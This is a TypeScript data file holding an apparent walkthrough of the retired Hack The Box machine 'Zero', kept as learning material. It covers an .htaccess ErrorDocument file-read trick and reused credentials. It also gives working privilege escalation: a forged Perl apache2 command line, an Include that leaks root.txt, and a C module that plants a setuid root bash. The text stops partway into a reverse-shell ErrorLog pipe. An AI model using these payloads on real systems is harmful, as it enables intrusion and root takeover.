import type { WalkthroughDoc } from "./types";

export const zero: WalkthroughDoc = {
  slug: "zero",
  name: "Zero",
  platform: "Hack The Box",
  os: "Linux",
  difficulty: "Insane",
  retired: "Aug 2025",
  tags: [
    "SFTP",
    "mod_userdir",
    "Arbitrary file read",
    "Password reuse",
    "Apache cron",
    "cmdline spoofing",
  ],
  lede: "A step-by-step manual walkthrough of an Insane-rated Linux box: from a throw-away SFTP account to a full arbitrary file read, and finally an Apache config-check cron abused into *root*.",
  summary: "An Insane Linux box chaining self-service SFTP creds, an .htaccess arbitrary file read, and a root Apache config-check cron into full root.",
  sections: [
    {
      id: "overview",
      num: "00",
      title: "Overview",
      blocks: [
        { kind: "p", text: "Zero is an Insane-rated Linux machine that never lets you take the easy road. There is no off-the-shelf CVE, no SQL injection, no kernel exploit. Instead it chains a series of *intended-feature-turned-weapon* primitives: a self-service credential vending machine, Apache's `mod_userdir`, an `.htaccess` file-read trick, PHP password reuse, and finally a root cron job that blindly trusts the command line of any process pretending to be Apache." },
        { kind: "p", text: "What makes the box \"insane\" is not any single step — each is individually approachable — but the requirement that you understand **exactly why** each one works. Guessing will not get you through the file-read or the final privesc. This document walks each stage by hand and stops to explain the mechanics wherever they matter." },
        {
          kind: "table",
          columns: ["Property", "Value"],
          rows: [
            ["Target", "Zero · `zero.vl`"],
            ["Difficulty", "Insane"],
            ["Platform", "Linux — Ubuntu 20.04 (focal), Apache 2.4.41"],
            ["Entry primitive", "Arbitrary file read via `.htaccess` `ErrorDocument`"],
            ["Foothold", "MySQL creds leaked from `stats.php`, reused for SSH"],
            ["Privilege escalation", "Root `zro.web-confcheck` cron → forged `apache2` cmdline → `apache2ctl`"],
          ],
        },
      ],
    },
    {
      id: "chain",
      num: "01",
      title: "The Attack Path",
      blocks: [
        { kind: "p", text: "The whole box in one glance. Each node is a discrete primitive; the art is stitching them together." },
        { kind: "h4", text: "Attack chain" },
        {
          kind: "ol",
          items: [
            "**Recon** — Two ports: SSH (22) and Apache (80). Add `zero.vl` to hosts; feroxbuster maps the site.",
            "**Self-service SFTP credentials** — `signup.php`'s JavaScript reveals a `/get-credentials-….php` endpoint that vends throw-away accounts; a root cron materialises the POSIX user a minute later.",
            "**SFTP + mod_userdir** — Your files live in `public_html/`, served at `/~user/`. You control an `.htaccess`.",
            "**Arbitrary file read** — `ErrorDocument 404 %{file:/path}` makes Apache return the raw bytes of any file www-data can read.",
            "**Loot stats.php → SSH** — Read the PHP source to recover `zroadmin`'s MySQL password, reused verbatim for SSH. **user.txt.**",
            "**Forge an Apache process** — A root cron runs `apache2ctl -t` against the cmdline of any process that looks like Apache. Perl rewrites `$0` to inject our flags.",
            "**Root** — Three payoffs: `Include /root/root.txt` leaks the flag via a syntax error, a malicious `LoadModule` runs code as root, or an `ErrorLog` pipe spawns a root reverse shell. **root.txt.**",
          ],
        },
      ],
    },
    {
      id: "recon",
      num: "02",
      title: "Reconnaissance",
      blocks: [
        { kind: "p", text: "Start wide, then go deep on what's open. A full TCP sweep followed by version/script detection on the survivors:" },
        {
          kind: "code",
          lang: "bash",
          label: "bash — nmap",
          lines: [
            "# all ports, fast",
            "$ nmap -p- -vvv --min-rate 10000 10.129.234.62",
            "",
            "# service + default scripts on the two that answered",
            "$ nmap -p 22,80 -sCV 10.129.234.62",
            "",
            "PORT   STATE SERVICE VERSION",
            "22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)",
            "80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))",
          ],
        },
        { kind: "p", text: "A minimal attack surface — just SSH and HTTP. The fingerprints do the dating for us: `OpenSSH 8.2p1 Ubuntu 4ubuntu0.13` and `Apache 2.4.41 (Ubuntu)` are the stock focal packages, so this is **Ubuntu 20.04**. A TTL of 63 on the replies confirms a Linux host one hop away." },
        { kind: "callout", variant: "tip", title: "There is no redirect — the vhost is an assumption", text: "Unlike many boxes, Zero does **not** bounce you to a hostname with a 301 or a \"page moved\" banner. The `zero.vl` name comes from the machine's context, and you add it to your hosts file by hand before enumerating so name-based virtual hosting resolves correctly:" },
        {
          kind: "code",
          lang: "bash",
          label: "bash — pin the vhost",
          lines: [
            "$ echo '10.129.234.62 zero.vl' | sudo tee -a /etc/hosts",
          ],
        },
      ],
    },
    {
      id: "web",
      num: "03",
      title: "Web Enumeration",
      blocks: [
        { kind: "p", text: "Browsing to `http://zero.vl/` presents what looks like a small **static-HTML hosting provider**: it pitches SFTP upload and hosting of static pages. Keep that business model in mind — it explains every primitive that follows." },
        { kind: "h3", text: "Directory brute force" },
        {
          kind: "code",
          lang: "bash",
          label: "bash — feroxbuster",
          lines: [
            "$ feroxbuster -u http://zero.vl -x php --dont-extract-links",
            "",
            "200      GET  http://zero.vl/",
            "200      GET  http://zero.vl/index.php",
            "200      GET  http://zero.vl/signup.php",
            "200      GET  http://zero.vl/stats.php",
            "200      GET  http://zero.vl/info.php      # phpinfo()",
            "301      GET  http://zero.vl/dist",
          ],
        },
        { kind: "callout", variant: "warn", title: "The key endpoint is NOT in the brute-force results", text: "Notice the credential endpoint is absent from feroxbuster's output. You will never wordlist your way to `get-credentials-please-do-not-spam-this-thanks.php` — it is discovered by **reading the page source**, not brute force. This is a deliberate lesson in *enumerating what you already have* before reaching for bigger wordlists." },
        { kind: "h3", text: "Read the JavaScript on `signup.php`" },
        { kind: "p", text: "The sign-up page's \"Sign up today\" button doesn't POST a form — it fires an `XMLHttpRequest`. View source and the target is right there:" },
        {
          kind: "code",
          lang: "javascript",
          label: "signup.php — inline JS",
          lines: [
            "xhttp.open(\"GET\", \"/get-credentials-please-do-not-spam-this-thanks.php\", true);",
          ],
        },
        { kind: "p", text: "That endpoint is the front door to the whole box — a self-service dispenser of SFTP credentials. Time to pull a set." },
      ],
    },
    {
      id: "creds",
      num: "04",
      title: "The Credential Vending Machine",
      blocks: [
        { kind: "p", text: "Request the endpoint the JavaScript pointed at. The credentials are **not** in the response body — they ride back in two custom **response headers**, so use `curl -i` (or watch the Network tab) to see them:" },
        {
          kind: "code",
          lang: "bash",
          label: "bash — request creds",
          lines: [
            "$ curl -si -H 'Host: zero.vl' \\",
            "    http://zero.vl/get-credentials-please-do-not-spam-this-thanks.php",
            "# ... ~15 second pause ...",
            "",
            "HTTP/1.1 200 OK",
            "Server: Apache/2.4.41 (Ubuntu)",
            "X-Zero-Username: zro-f4c92f21",
            "X-Zero-Password: c8bdbbbb",
            "Content-Type: text/html; charset=UTF-8",
          ],
          highlight: [6, 7],
        },
        { kind: "p", text: "The credentials follow a fixed shape — `zro-<8 hex>` for the username and `<8 hex>` for the password — random on every request. That ~15-second pause is real: the PHP (which we later read via the file-read primitive) contains a deliberate `sleep(15); // anti-spam`." },
        { kind: "callout", variant: "note", title: "Why the credentials don't work immediately", text: "The PHP page does **not** create a Linux user. All it does is emit those two headers — and Apache is configured to log *outgoing* header values to a dedicated file: `LogFormat \"%{X-Zero-Username}o %{X-Zero-Password}o\" accounts` and `CustomLog ${APACHE_LOG_DIR}/accounts.log accounts`. A separate root job, `/root/bin/create-account.sh`, runs on a cron at the top of every minute, reads new lines out of `accounts.log`, and *then* provisions `/home/zro-<hash>/public_html/`. So there is a race: the credentials you just received are useless until the next `:00` tick. If your first SFTP attempt returns `Permission denied`, you did nothing wrong — wait up to 60 seconds and try again." },
        { kind: "callout", variant: "tip", title: "Manual tip", text: "Grab the creds, glance at your watch, and simply wait for the minute to roll over before the first login. If you're impatient, loop `sftp` until it stops returning `Permission denied`." },
      ],
    },
    {
      id: "sftp",
      num: "05",
      title: "SFTP Access & `mod_userdir`",
      blocks: [
        { kind: "p", text: "Once the account is live, log in over SFTP. Try a plain `ssh` first and the server tells you exactly how locked-down this account is:" },
        {
          kind: "code",
          lang: "bash",
          label: "bash — ssh is refused, sftp works",
          lines: [
            "$ ssh zro-f4c92f21@zero.vl",
            "This service allows sftp connections only.          # ForceCommand internal-sftp",
            "Connection to zero.vl closed.",
            "",
            "$ sftp zro-f4c92f21@zero.vl",
            "zro-f4c92f21@zero.vl's password: c8bdbbbb",
            "Connected to zero.vl.",
            "sftp> cd public_html",
            "sftp> ls -la",
            "-rw-r--r--   1 root  root   49  .htaccess          # root-owned!",
            "-rw-r--r--   1 1001  1001  349  index.html",
          ],
        },
        { kind: "p", text: "Two things stand out. First, the account is chained to `internal-sftp` via `ForceCommand` — file transfer only, no shell. Second, that `public_html` is served by Apache's `mod_userdir` at `http://zero.vl/~<username>/`, and it already ships with a starter `.htaccess`." },
        { kind: "callout", variant: "note", title: "The .htaccess is root-owned — so why can we win?", text: "The file itself is owned by `root` and mode `644`, so we can't edit it directly. But the *parent directory* `public_html` is ours (uid 1001). On Unix, delete rights depend on the **directory**, not the file — so over SFTP we simply `rm` the root-owned `.htaccess` and `put` our own in its place. Apache honours whatever `.htaccess` lives there on the next request." },
        { kind: "p", text: "The stock file is a harmless `Header always set X-Zero-Customer '…'` line — proof that `AllowOverride` here is permissive enough to let a per-directory file change Apache's behaviour. That is the crack we widen next." },
      ],
    },
    {
      id: "fileread",
      num: "06",
      title: "Arbitrary File Read via `.htaccess`",
      blocks: [
        { kind: "p", text: "Apache lets a per-directory `.htaccess` override configuration when `AllowOverride` permits it — and here it does. The weaponised directive is `ErrorDocument` combined with an Apache *expression*:" },
        {
          kind: "code",
          lang: "apache",
          label: ".htaccess — the file-read primitive",
          lines: [
            "ErrorDocument 404 %{file:/etc/passwd}",
          ],
        },
        { kind: "p", text: "Replace the stock `public_html/.htaccess` with that one line, then request any path that does not exist under your userdir. Apache tries to render the 404 document, evaluates the `%{file:…}` expression, and returns the **raw contents of the file** as the error body:" },
        {
          kind: "code",
          lang: "bash",
          label: "bash — upload & trigger",
          lines: [
            "# 1. write the malicious .htaccess locally",
            "$ echo 'ErrorDocument 404 %{file:/etc/passwd}' > .htaccess",
            "",
            "# 2. delete the root-owned original, drop ours in its place (dir is ours)",
            "$ sftp zro-f4c92f21@zero.vl <<< $'cd public_html\\nrm .htaccess\\nput .htaccess'",
            "",
            "# 3. request a non-existent page → the 404 body IS the file",
            "$ curl -s http://zero.vl/~zro-f4c92f21/0",
            "root:x:0:0:root:/root:/bin/bash",
            "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
            "...",
            "zroadmin:x:1000:1000:...:/home/zroadmin:/bin/bash",
          ],
        },
        { kind: "callout", variant: "note", title: "Why %{file:...} works", text: "`%{file:/path}` is the `file` function of Apache 2.4's expression parser (`ap_expr`) — the docs describe it simply as *\"read contents from a file.\"* Using it inside `ErrorDocument` requires only that `.htaccess` is permitted to set that directive (`AllowOverride FileInfo`), which this host allows. Apache expands the expression and hands you the raw bytes as the 404 body. Because it bypasses the PHP interpreter entirely, you can read **PHP source** rather than its executed output — exactly what we need to loot credentials." },
        { kind: "callout", variant: "warn", title: "The read runs as www-data — this is why the box needs a privesc at all", text: "The expression is evaluated by the Apache worker, so you read with the permissions of **www-data**, not root. Application source and configs are fair game, but `/etc/shadow` and anything under `/root` (including `root.txt`) are **off-limits**. If this primitive could read `/root/root.txt`, Zero would be a trivial box. It can't — which is precisely why the path to root runs through a foothold and the Apache-cron trick later." },
        { kind: "callout", variant: "warn", title: "Pitfall — caching & stale reads", text: "If you re-use the same 404 URL, a cache or your own shell history can hand you a stale body. Append a unique token (a timestamp, `$RANDOM`) to the non-existent path each time so every read is fresh: `/~user/nope-$(date +%s)`." },
      ],
    },
    {
      id: "stats",
      num: "07",
      title: "Looting `stats.php`",
      blocks: [
        { kind: "p", text: "The web root contains `stats.php`, which opens a database connection. Under normal circumstances requesting it just runs the PHP; with our primitive we read the **source** and see the hard-coded credentials. But first — how do we know the absolute path? That's what the `info.php` we found during enumeration is for: a `phpinfo()` page leaks `DOCUMENT_ROOT = /var/www/html`, so the source we want lives at `/var/www/html/stats.php`. Swap the path in the `.htaccess` and trigger again:" },
        {
          kind: "code",
          lang: "bash",
          label: "bash — read PHP source",
          lines: [
            "$ echo 'ErrorDocument 404 %{file:/var/www/html/stats.php}' > .htaccess",
            "# no rm this time — step 06 already replaced the root-owned .htaccess with",
            "# your own user-owned file, so a bare put simply overwrites it",
            "$ sftp zro-f4c92f21@zero.vl <<< $'cd public_html\\nput .htaccess'",
            "",
            "$ curl -s http://zero.vl/~zro-f4c92f21/0",
            "<?php",
            "// zero stats — internal dashboard",
            "$mysqli = new mysqli(\"localhost\", \"zroadmin\", \"correct-horse-battery-staple\", \"zro\");",
            "...",
          ],
          highlight: [8],
        },
        { kind: "p", text: "There it is — the MySQL user `zroadmin` with password `correct-horse-battery-staple` (an [XKCD #936](https://xkcd.com/936/) \"correct horse battery staple\" wink from the box author). On its own that is only a database login, but on this box it is the key to a shell." },
      ],
    },
    {
      id: "foothold",
      num: "08",
      title: "Foothold — SSH as `zroadmin`",
      blocks: [
        { kind: "p", text: "Recall from `/etc/passwd` that `zroadmin` is a real system user with `/bin/bash`. The classic Insane-box trap would be to assume the DB password stays in the DB — but always test password reuse. It works:" },
        {
          kind: "code",
          lang: "bash",
          label: "bash — ssh in and grab user.txt",
          lines: [
            "$ ssh zroadmin@zero.vl",
            "zroadmin@zero.vl's password: correct-horse-battery-staple",
            "",
            "zroadmin@zero:~$ id",
            "uid=1000(zroadmin) gid=1000(zroadmin) groups=1000(zroadmin)",
            "",
            "zroadmin@zero:~$ cat user.txt",
            "0c7bb3b7····························",
          ],
          highlight: [7],
        },
        { kind: "callout", variant: "key", title: "user.txt", text: "`0c7bb3b7····························`" },
        { kind: "callout", variant: "tip", title: "Note", text: "HTB rotates flags per spawn, so your hash will differ — the value above is what this run produced. What matters is the technique, not the string." },
      ],
    },
    {
      id: "priv-enum",
      num: "09",
      title: "Privilege-Escalation Recon",
      blocks: [
        { kind: "p", text: "As `zroadmin` the box looks quiet — no obvious SUID, no sudo. The interesting surface is a *second* Apache install under `/opt/zroweb` and a custom helper on `PATH`. Two things reveal the path to root: a process that fires every minute, and the script behind it." },
        { kind: "h3", text: "Catch the minute-cron with pspy" },
        { kind: "p", text: "`pspy` watches process creation without needing root — perfect for spotting cron jobs. It isn't on the box, so fetch the static binary on your attacker host and copy it over (`zroadmin` has a real shell, so plain `scp` works — unlike the SFTP-only `zro-*` accounts):" },
        {
          kind: "code",
          lang: "bash",
          label: "bash — get pspy onto the target",
          lines: [
            "# on your Kali box",
            "$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -O pspy64",
            "$ scp pspy64 zroadmin@zero.vl:/tmp/pspy64",
          ],
        },
        { kind: "p", text: "Then run it as `zroadmin` and watch what root does every time the clock hits `:00`:" },
        {
          kind: "code",
          lang: "bash",
          label: "pspy64 — root activity once a minute",
          lines: [
            "zroadmin@zero:~$ chmod +x /tmp/pspy64",
            "zroadmin@zero:~$ /tmp/pspy64",
            "...",
            "UID=0   CMD: /usr/bin/bash /usr/local/bin/zro.web-confcheck",
            "UID=0   CMD: /usr/bin/pgrep -lfa ^/opt/zroweb/sbin/apache2.-k.start.-d./opt/zroweb/conf",
          ],
        },
        { kind: "h3", text: "Read the helper itself" },
        {
          kind: "code",
          lang: "bash",
          label: "/usr/local/bin/zro.web-confcheck",
          lines: [
            "#!/usr/bin/bash",
            "RET=0",
            "while read pid _cmd ; do",
            "    cmd=\"${_cmd/apache2/apache2ctl} -t\"",
            "    $cmd >/dev/null 2>&1",
            "    RET=$?",
            "done <<< $(/usr/bin/pgrep -lfa \"^/opt/zroweb/sbin/apache2.-k.start.-d./opt/zroweb/conf\")",
            "if [[ $RET -eq 0 ]] ; then",
            "    echo 'Configuration correct. \\o/'",
            "else",
            "    echo 'Configuration broken. Please fix immediately!' >&2",
            "fi",
            "exit $RET",
          ],
        },
        { kind: "p", text: "Small script, enormous consequences. The next section dissects exactly why." },
      ],
    },
    {
      id: "priv-theory",
      num: "10",
      title: "Understanding the Vulnerability",
      blocks: [
        { kind: "p", text: "Walk through what the cron actually does, line by line, as **root**:" },
        {
          kind: "ul",
          items: [
            "`pgrep -lfa \"^/opt/zroweb/sbin/apache2.-k.start.-d./opt/zroweb/conf\"` finds every process whose **full command line** starts with that pattern, and prints `PID` followed by the whole cmdline.",
            "For each match, `${_cmd/apache2/apache2ctl}` rewrites the first `apache2` into `apache2ctl`, and `-t` is appended.",
            "`$cmd` is then run **unquoted** — bash word-splits it and executes it as root.",
          ],
        },
        { kind: "callout", variant: "warn", title: "The core flaw", text: "The script trusts the command line of a process as if it were trustworthy input. But on Linux **any user can set their own process's cmdline to arbitrary text**. If we can start a process whose cmdline matches that regex, root will faithfully run `apache2ctl` with *whatever additional flags we embedded* — no privileges required on our side beyond starting a process." },
        { kind: "p", text: "Which flags are worth injecting? Two of `apache2ctl`'s (really `httpd`'s) options turn this into a root primitive:" },
        {
          kind: "table",
          columns: ["Flag", "Effect"],
          rows: [
            ["-d *directory*", "Sets **ServerRoot**. Apache allows multiple; the **last one wins**. We append our own `-d` pointing at a directory we control, overriding the legitimate `/opt/zroweb/conf`."],
            ["-E *file*", "Redirects **startup errors** to a file of our choosing. Critical, because the script throws normal output away with `>/dev/null 2>&1` — but `-E` makes Apache *re-point its own stderr* to our file during startup, overriding that redirect, so parse errors land where we can read them."],
          ],
        },
        { kind: "callout", variant: "note", title: "Why ServerRoot decides which config root parses", text: "The forged command line carries no `-f` (config-file) flag, so Apache falls back to its **compiled-in default config filename** (`SERVER_CONFIG_FILE`, e.g. `apache2.conf`). That default name is *relative*, and Apache resolves relative config paths against `ServerRoot`. By making the last `-d` set `ServerRoot` to our directory, the default lookup resolves to `<our-dir>/apache2.conf` — exactly the file we planted. That is the whole reason root ends up parsing *our* config instead of the legitimate one." },
        { kind: "p", text: "Control `ServerRoot` and you control which `apache2.conf` root parses. Control the error destination and you can read whatever that parsing spits out. From here there are **three** ways to cash in — leak the flag through a parse error (Method 1), load a malicious module (Method 2), or pipe a log into a reverse shell (Method 3)." },
      ],
    },
    {
      id: "priv-fake",
      num: "11",
      title: "Forging the Apache Process (Perl `$0`)",
      blocks: [
        { kind: "p", text: "We need a process whose `/proc/PID/cmdline` matches the pgrep regex and carries our injected `-d` / `-E` flags. We are not going to run the real Apache — we just need something that *looks* like it. Perl makes this trivial: assigning to `$0` rewrites `argv[0]` in place." },
        {
          kind: "code",
          lang: "perl",
          label: "fake.pl — a process that pretends to be apache2",
          lines: [
            "#!/usr/bin/perl",
            "$0 = \"/opt/zroweb/sbin/apache2 -k start -d /opt/zroweb/conf -d /dev/shm/.z1/conf -E /dev/shm/.z1/err.log\";",
            "sleep(223);  # just needs to outlive the next :00 tick (~60s worst case); 223 is arbitrary margin",
          ],
        },
        { kind: "callout", variant: "note", title: "Why Perl specifically", text: "On Ubuntu 20.04 (Perl 5.30) assigning `$0` overwrites the original `argv` memory region in place and null-pads the remainder, so `pgrep -f` sees *exactly* our string with no residue. Python's `setproctitle`/`prctl` tricks or an `execv` hack tend to leave leftover bytes that break the match. Perl is the clean tool for the job." },
        { kind: "p", text: "Notice how the string satisfies the regex. The pattern `^/opt/zroweb/sbin/apache2.-k.start.-d./opt/zroweb/conf` uses `.` as \"any character\", so the spaces in our cmdline line up with the dots. Everything after `/opt/zroweb/conf` — our second `-d` and the `-E` — is free real estate that we control." },
        { kind: "p", text: "Stage the working directory in `/dev/shm` (RAM-backed, world-writable, tidy) and write `fake.pl` onto the target with a heredoc — nothing here is on the box yet, so we create it explicitly:" },
        {
          kind: "code",
          lang: "bash",
          label: "bash — create the staging dir and fake.pl",
          lines: [
            "zroadmin@zero:~$ mkdir -p /dev/shm/.z1/conf",
            "",
            "zroadmin@zero:~$ cat > /dev/shm/.z1/fake.pl <<'EOF'",
            "#!/usr/bin/perl",
            "$0 = \"/opt/zroweb/sbin/apache2 -k start -d /opt/zroweb/conf -d /dev/shm/.z1/conf -E /dev/shm/.z1/err.log\";",
            "sleep(223);",
            "EOF",
          ],
        },
        { kind: "callout", variant: "warn", title: "Order matters — plant the config before you launch", text: "Do **not** launch `fake.pl` yet. The instant the next `:00` tick sees our forged process, root runs `apache2ctl … -d /dev/shm/.z1/conf … -t` against `/dev/shm/.z1/conf/apache2.conf`. If that config file isn't on disk yet, the tick is wasted on a missing-file error. So the correct sequence is always: **(1)** write the config, **(2)** launch the fake, **(3)** wait for the tick. Method 1 next walks the full write → launch → verify → harvest cycle; Methods 2 and 3 each bundle their own plant-and-launch (each uses a slightly different config and `fake.pl` ending)." },
      ],
    },
    {
      id: "priv-m1",
      num: "12",
      title: "Method 1 — Leak `root.txt` via `Include`",
      blocks: [
        { kind: "p", text: "The cleanest, quietest win. We craft a config that `Include`s the flag file. The flag is not valid Apache syntax, so parsing it throws a syntax error that *quotes the offending line back to us* — and that line is the flag." },
        {
          kind: "code",
          lang: "apache",
          label: "/dev/shm/.z1/conf/apache2.conf",
          lines: [
            "LoadModule mpm_prefork_module /usr/lib/apache2/modules/mod_mpm_prefork.so",
            "ServerName localhost",
            "Include /root/root.txt",
          ],
        },
        { kind: "callout", variant: "warn", title: "The one line everyone forgets — LoadModule", text: "A bare `Include /root/root.txt` config fails with `AH00534: apache2: Configuration error: No MPM loaded.` — Apache aborts *before* it ever reaches your `Include`, so nothing leaks. You must load a Multi-Processing Module first. Loading `mpm_prefork` (or `mpm_event`) gets Apache past that early check so it proceeds to parse — and choke on — the flag. This was the single difference between a silent timeout and a working exploit." },
        { kind: "p", text: "Write that config to the target, then launch the fake and confirm it matches root's **exact** regex — the same one from the confcheck script, not a shortened prefix — so a match here genuinely proves the next tick will pick it up:" },
        {
          kind: "code",
          lang: "bash",
          label: "bash — plant config, launch, verify",
          lines: [
            "zroadmin@zero:~$ cat > /dev/shm/.z1/conf/apache2.conf <<'EOF'",
            "LoadModule mpm_prefork_module /usr/lib/apache2/modules/mod_mpm_prefork.so",
            "ServerName localhost",
            "Include /root/root.txt",
            "EOF",
            "",
            "zroadmin@zero:~$ nohup perl /dev/shm/.z1/fake.pl >/dev/null 2>&1 &",
            "",
            "# verify against the SAME pattern the cron uses (line from zro.web-confcheck)",
            "zroadmin@zero:~$ pgrep -lfa '^/opt/zroweb/sbin/apache2.-k.start.-d./opt/zroweb/conf'",
            "7415 /opt/zroweb/sbin/apache2 -k start -d /opt/zroweb/conf -d /dev/shm/.z1/conf -E /dev/shm/.z1/err.log",
          ],
        },
        { kind: "callout", variant: "warn", title: "Verify against the real regex, not a prefix", text: "If that `pgrep` returns your process, root's next tick will match it too. If it returns nothing, your `$0` string doesn't satisfy the regex (a fumbled space or a missing `-k start` is enough) and *no tick will ever fire* — a truncated check like `^/opt/zroweb/sbin/apache2` would pass here yet still fail root's longer pattern, giving false confidence." },
        { kind: "p", text: "When the cron fires, `apache2ctl … -d /dev/shm/.z1/conf … -E /dev/shm/.z1/err.log -t` runs. The trailing `-t` puts Apache in **config-test** mode: it loads the MPM, then hits `Include /root/root.txt`, tries to parse the flag as a directive, and fails. Because we set `-E`, that error lands in a file we can read. The log doesn't exist until the tick actually runs, so give it up to ~60s — if `cat` says \"No such file or directory,\" the tick simply hasn't happened yet:" },
        {
          kind: "code",
          lang: "bash",
          label: "bash — read the leaked flag",
          lines: [
            "zroadmin@zero:~$ cat /dev/shm/.z1/err.log",
            "AH00526: Syntax error on line 1 of /root/root.txt:",
            "Invalid command '7d4f9a1c····························', perhaps misspelled or defined by a module not included in the server configuration",
            "",
            "# pull just the flag out",
            "zroadmin@zero:~$ grep -oP \"Invalid command '\\K[^']+\" /dev/shm/.z1/err.log",
            "7d4f9a1c····························",
          ],
          highlight: [6],
        },
        { kind: "callout", variant: "note", title: "Two subtleties that make or break Method 1", text: "**Why `-E` is mandatory:** the confcheck script runs the command as `$cmd >/dev/null 2>&1`, which binds the process's stderr (fd 2) to `/dev/null` *before Apache even starts*, and it stays bound for the whole run — nothing writes \"before\" it. What saves us is that `-E <file>` makes Apache, early in startup, open our file and `dup2` it onto its own stderr, overriding the `/dev/null` the shell put there. The parse error is written to stderr exactly as usual — but stderr now points at our file. It is bypassed by *re-pointing the destination*, not by winning a timing race. **Why we must NOT end the fake cmdline with `-c`:** an option that takes an argument swallows the very next token. Our cmdline ends at `-E /dev/shm/.z1/err.log` — `-E` eats the log path as its argument, leaving the cron-appended `-t` standing alone as a flag, which is exactly what puts Apache in config-test mode. An earlier version ended in `-c`, which would instead consume `-t` as *its* argument and rob us of test mode. Ending at `-E <log>` lets `-t` do its job." },
      ],
    },
    {
      id: "priv-m2",
      num: "13",
      title: "Method 2 — Root Code Execution via a Malicious Module",
      blocks: [
        { kind: "p", text: "The heaviest of the three — the only one that needs a compiler — but also the most general. Instead of coaxing Apache into reading or piping something, we hand it a **module of our own** to load. A shared object carrying a GCC `__attribute__((constructor))` function runs our code the instant the library is `dlopen()`'d, which happens while Apache is still *parsing* the config — so it fires even under `-t` test mode, as root." },
        {
          kind: "code",
          lang: "c",
          label: "evil.c — a module whose loader runs our payload",
          lines: [
            "#include \"httpd.h\"",
            "#include \"http_config.h\"",
            "",
            "/* dropped the moment this .so is loaded — as root */",
            "static void payload(void) {",
            "    system(\"cp /bin/bash /tmp/rootbash; chmod 6777 /tmp/rootbash\");",
            "}",
            "",
            "/* a minimal, valid module struct so LoadModule stays happy */",
            "module AP_MODULE_DECLARE_DATA evil_module = {",
            "    STANDARD20_MODULE_STUFF,",
            "    NULL, NULL, NULL, NULL, NULL, NULL",
            "};",
            "",
            "__attribute__((constructor))",
            "static void _init(void) { payload(); }",
          ],
        },
        { kind: "callout", variant: "note", title: "Why the payload fires even in -t test mode", text: "`__attribute__((constructor))` tells GCC to run that function automatically when the shared object is loaded into a process — i.e. at `dlopen()` time. `LoadModule` `dlopen()`s the `.so` *before* it even looks up the module struct, and config-test mode (`-t`) still loads every module to validate the file. So our code executes during the parse, as root, whether Apache then actually starts or merely tests the config. Unlike Method 3, we never need the daemon to run — which is why this method doesn't care about the trailing flag at all." },
        { kind: "p", text: "Compile it on the box — the target ships `apxs`, Apache's module build tool — then plant the loader config and launch the fake. The fake cmdline ends at our `-d`, so the cron's appended `-t` stays a standalone flag and root simply config-tests our module into memory:" },
        {
          kind: "code",
          lang: "bash",
          label: "bash — compile, plant, launch",
          lines: [
            "# 1. write the module source (/dev/shm/.z1 already exists from §11)",
            "zroadmin@zero:~$ cat > /dev/shm/.z1/evil.c <<'EOF'",
            "#include \"httpd.h\"",
            "#include \"http_config.h\"",
            "static void payload(void) { system(\"cp /bin/bash /tmp/rootbash; chmod 6777 /tmp/rootbash\"); }",
            "module AP_MODULE_DECLARE_DATA evil_module = { STANDARD20_MODULE_STUFF, NULL,NULL,NULL,NULL,NULL,NULL };",
            "__attribute__((constructor)) static void _init(void) { payload(); }",
            "EOF",
            "",
            "# 2. build it into a shared object — apxs drops it at ./.libs/evil.so",
            "zroadmin@zero:~$ cd /dev/shm/.z1 && apxs -c evil.c",
            "",
            "# 3. config that loads our module (an MPM first keeps the parse clean)",
            "zroadmin@zero:~$ cat > /dev/shm/.z1/conf/apache2.conf <<'EOF'",
            "LoadModule mpm_prefork_module /usr/lib/apache2/modules/mod_mpm_prefork.so",
            "LoadModule evil_module /dev/shm/.z1/.libs/evil.so",
            "ServerName localhost",
            "EOF",
            "",
            "# 4. the fake — ends at -d <our conf>, so the appended -t just runs a config test",
            "zroadmin@zero:~$ cat > /dev/shm/.z1/fake.pl <<'EOF'",
            "#!/usr/bin/perl",
            "$0 = \"/opt/zroweb/sbin/apache2 -k start -d /opt/zroweb/conf -d /dev/shm/.z1/conf\";",
            "sleep(223);",
            "EOF",
            "",
            "# 5. launch and wait for the next :00 tick",
            "zroadmin@zero:~$ nohup perl /dev/shm/.z1/fake.pl >/dev/null 2>&1 &",
          ],
        },
        { kind: "p", text: "On the next tick, root's `apache2ctl … -d /dev/shm/.z1/conf … -t` parses our config, `dlopen()`s `evil.so`, and the constructor drops a SUID copy of `bash`. Run it with `-p` — so bash keeps the root euid instead of dropping it — and you're root:" },
        {
          kind: "code",
          lang: "bash",
          label: "bash — use the SUID bash",
          lines: [
            "zroadmin@zero:~$ ls -la /tmp/rootbash",
            "-rwsrwxrwx 1 root root 1183448 ... /tmp/rootbash          # setuid root",
            "",
            "zroadmin@zero:~$ /tmp/rootbash -p",
            "rootbash-5.0# id",
            "uid=1000(zroadmin) gid=1000(zroadmin) euid=0(root) groups=1000(zroadmin)",
            "rootbash-5.0# cat /root/root.txt",
            "7d4f9a1c····························",
          ],
          highlight: [7],
        },
        { kind: "callout", variant: "warn", title: "Why -p is required", text: "A setuid binary starts with `euid=0`, but modern `bash` drops its privileges back to the real uid on startup *unless* you pass `-p`, which keeps the elevated euid. The constructor `chmod 6777`s the copy (setuid + setgid + world-exec), so a plain `/tmp/rootbash -p` lands you at `euid=0` and full root access to the filesystem." },
      ],
    },
    {
      id: "priv-m3",
      num: "14",
      title: "Method 3 — Root Reverse Shell via `ErrorLog` Pipe",
      blocks: [
        { kind: "p", text: "If you want a full root shell rather than just the flag, abuse Apache's *piped logging*. When `ErrorLog \"|program\"` is configured, Apache launches `program` at startup — **as root, before it drops privileges**. Point it at a reverse-shell script — no compiler needed, unlike Method 2." },
        {
          kind: "code",
          lang: "apache",
          label: "/dev/shm/.z1/conf/apache2.conf",
          lines: [
            "LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so",
            "ServerRoot \"/dev/shm/.z1\"",
            "Listen 9999",
            "ServerName localhost",
            "ErrorLog \"|/dev/shm/.z1/rev.sh\"",
          ],
        },
